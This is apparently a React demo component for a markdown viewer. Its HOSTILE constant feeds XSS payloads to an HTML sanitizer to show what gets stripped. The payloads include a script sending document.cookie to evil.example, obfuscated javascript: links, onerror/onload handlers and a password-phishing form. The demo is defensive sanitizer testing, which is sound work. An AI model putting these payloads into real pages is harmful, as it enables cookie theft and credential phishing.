// MarkdownView demos: the kitchen-sink document on both render paths, and the
// sanitizer boundary run against a hostile payload — so the trust model is
// something you can look at rather than something you take on faith.
import { useMemo, useState } from 'react';
import { getMockCallCounts, usingMockTransport } from 'portal-mojo/client';
// MERGE-WIRE: portal-mojo/ui
import { MarkdownView } from '../../../../../packages/portal-mojo/src/ui/MarkdownView';
// MERGE-WIRE: portal-mojo/client
import { clearMarkdownCache, sanitizeMarkdownHtml, type SanitizeDrop } from '../../../../../packages/portal-mojo/src/client/markdown';

const SAMPLE = [
    '# Release notes — portal 0.4',
    '',
    'Rendered by **django-mojo** (`POST /api/docit/render`), sanitized here, with a',
    'dependency-free client renderer behind it. Single newlines become `<br>` — the',
    'backend runs mistune with `hard_wrap=True`, so this line stays under the last.',
    '',
    '## What landed',
    '',
    '- **ModelTable** — server-driven sort, filters and paging',
    '  - column chooser, with `hideable: false` locks',
    '  - batch actions over `Promise.allSettled`',
    '- *Charts* without a chart library',
    '- ~~jQuery~~ removed for good',
    '',
    '### Checklist',
    '',
    '- [x] port the filter dialogs',
    '- [x] both themes, day one',
    '- [ ] docit viewer (follow-on)',
    '',
    '## Wire contract',
    '',
    '| Field | Type | Notes |',
    '| --- | --- | --- |',
    '| `status` | bool | `false` carries `error` |',
    '| `start` / `size` | int | paging, never `page` |',
    '| `created` | int | epoch **seconds** |',
    '',
    '## Code',
    '',
    '```python',
    'def on_render(request):',
    '    markdown = request.DATA.get("markdown")',
    '    return {"html": MarkdownRenderer().render_safe(markdown)}',
    '```',
    '',
    'Inline `mojoCall(path, {method: "POST"})` is the one unwrap boundary.',
    '',
    '> Failure is unmissable: a failed save REJECTS.',
    '> It is never resolved as success.',
    '',
    '## Links & images',
    '',
    'External [nativemojo.com](https://nativemojo.com), a bare autolink',
    'https://maestromojo.com, and mail to <mailto:ian@nativemojo.com>.',
    '',
    '![a relative image — src dropped, alt text stays](/assets/diagram.png)',
    '',
    'Raw HTML in the source is escaped, never re-emitted: <script>alert(1)</script>',
    '',
    '---',
    '',
    '###### Rendered by MarkdownView',
].join('\n');

const HOSTILE = [
    '<h2 class="md-note panel sidebar">A heading carrying three classes</h2>',
    '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>',
    '<p onclick="alert(1)" style="position:fixed;inset:0;background:red">Handler + full-screen style</p>',
    '<a href="javascript:alert(document.domain)">totally safe link</a>',
    '<a href="java&Tab;script:alert(1)">obfuscated javascript:</a>',
    '<a href="#footnote-1">a same-page fragment</a>',
    '<a href="https://nativemojo.com">a real link</a>',
    '<img src="x" onerror="alert(1)">',
    '<img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;">',
    '<iframe src="https://evil.example"></iframe>',
    '<style>body { display: none }</style>',
    '<form action="https://evil.example"><input type="password" name="pw"></form>',
    '<div class="highlight"><pre><span class="k">def</span> f(): <span class="c">#kept</span></pre></div>',
    '<ul><li><input type="checkbox" disabled checked> a real task item</li></ul>',
    '<svg><use href="#x" /></svg>',
    '<!-- a comment -->',
].join('\n');

const MONO = { fontFamily: 'ui-monospace, Menlo, monospace', fontSize: 12.5, lineHeight: 1.55 } as const;

function renderCalls(): number {
    return getMockCallCounts()['POST /api/docit/render'] ?? 0;
}

export function MarkdownDemo() {
    const [source, setSource] = useState(SAMPLE);
    const [view, setView] = useState<'rendered' | 'raw'>('rendered');
    const [renderer, setRenderer] = useState<'server' | 'client'>('server');
    // The mock's counter is module state — this only forces a re-read of it.
    const [, bumpCounter] = useState(0);
    const calls = renderCalls();

    // The drop log describes the output beside it, so both are memoized as one.
    const { sanitized, drops } = useMemo(() => {
        const found: SanitizeDrop[] = [];
        try {
            return { sanitized: sanitizeMarkdownHtml(HOSTILE, (d) => found.push(d)), drops: found };
        } catch (err) {
            return { sanitized: `sanitizer unavailable: ${err instanceof Error ? err.message : String(err)}`, drops: found };
        }
    }, []);

    return (
        <>
            <div className="panel panel-pad">
                <div className="demo-row" style={{ marginBottom: 12 }}>
                    <div className="seg">
                        {(['rendered', 'raw'] as const).map((v) => (
                            <button key={v} className={`seg-btn${view === v ? ' seg-active' : ''}`} onClick={() => setView(v)}>
                                {v === 'rendered' ? 'Rendered' : 'Raw source'}
                            </button>
                        ))}
                    </div>
                    <div className="seg">
                        {(['server', 'client'] as const).map((r) => (
                            <button key={r} className={`seg-btn${renderer === r ? ' seg-active' : ''}`} onClick={() => setRenderer(r)}>
                                {r === 'server' ? 'server (docit)' : 'client fallback'}
                            </button>
                        ))}
                    </div>
                    <button className="btn btn-compact" onClick={() => setSource(SAMPLE)}>
                        <i className="bi bi-arrow-counterclockwise" /> Reset sample
                    </button>
                    {usingMockTransport() && (
                        <>
                            <button className="btn btn-compact" onClick={() => { clearMarkdownCache(); bumpCounter((n) => n + 1); }}>
                                <i className="bi bi-trash3" /> Clear cache
                            </button>
                            <span className="dim">
                                <code>POST /api/docit/render</code>: <strong>{calls}</strong> calls
                            </span>
                        </>
                    )}
                </div>
                <p className="dim" style={{ marginBottom: 12 }}>
                    Type in the source and watch it re-render. <code>debounceMs=300</code> makes a burst of typing
                    ONE request instead of one per keystroke, and the client fallback paints every frame in
                    between — so the layout never jumps and there is no empty state at any point. Switch to{' '}
                    <em>client fallback</em> and the wire is never touched at all. Cache proof: edit the text, press{' '}
                    <em>Reset sample</em> — the counter does not move, because that document is already rendered.
                    Press <em>Clear cache</em> first and the same Reset costs one call.
                </p>
                <div className="md-split">
                    <textarea
                        className="input"
                        style={{ ...MONO, minHeight: 420, resize: 'vertical' }}
                        value={source}
                        onChange={(e) => setSource(e.target.value)}
                        spellCheck={false}
                        aria-label="Markdown source"
                    />
                    {view === 'rendered' ? (
                        <MarkdownView source={source} renderer={renderer} debounceMs={300} />
                    ) : (
                        <pre className="input" style={{ ...MONO, minHeight: 420, margin: 0, overflow: 'auto', whiteSpace: 'pre-wrap' }}>
                            {source}
                        </pre>
                    )}
                </div>
            </div>

            <div className="panel panel-pad">
                <div className="eyebrow">The trust model</div>
                <p className="dim" style={{ margin: '4px 0 12px' }}>
                    Server HTML is UNTRUSTED. Everything on the left went through{' '}
                    <code>sanitizeMarkdownHtml</code> and came out on the right: allowlisted elements kept,
                    dangerous ones removed with their whole subtree, unknown ones unwrapped so their text
                    survives. The result is shown as TEXT — this demo deliberately has no{' '}
                    <code>dangerouslySetInnerHTML</code> of its own, because MarkdownView is the only sanctioned one.
                </p>
                <div className="md-split">
                    <div>
                        <div className="eyebrow">In — hostile</div>
                        <pre className="input" style={{ ...MONO, fontSize: 11.5, margin: 0, overflow: 'auto', whiteSpace: 'pre-wrap' }}>{HOSTILE}</pre>
                    </div>
                    <div>
                        <div className="eyebrow">Out — sanitized</div>
                        <pre className="input" style={{ ...MONO, fontSize: 11.5, margin: 0, overflow: 'auto', whiteSpace: 'pre-wrap' }}>{sanitized}</pre>
                    </div>
                </div>
                <div className="eyebrow" style={{ marginTop: 16 }}>What the walk did ({drops.length} actions)</div>
                <table className="demo-table" style={{ width: '100%' }}>
                    <tbody>
                        {drops.map((d, i) => (
                            <tr key={i}>
                                <td style={{ width: 120 }}><code>{d.kind}</code></td>
                                <td><code>{d.detail}</code></td>
                            </tr>
                        ))}
                    </tbody>
                </table>
                <p className="dim" style={{ marginTop: 12 }}>
                    Note the survivors: the real link kept its <code>href</code> and gained{' '}
                    <code>target=_blank rel=&quot;noopener noreferrer&quot;</code>; the task checkbox kept its{' '}
                    <code>checked</code> state and is forced <code>disabled</code>; the syntax-highlight{' '}
                    <code>div</code>/<code>span</code> wrappers were unwrapped with their code text intact; and of
                    three classes only the <code>md-</code> one survived.
                </p>
            </div>
        </>
    );
}
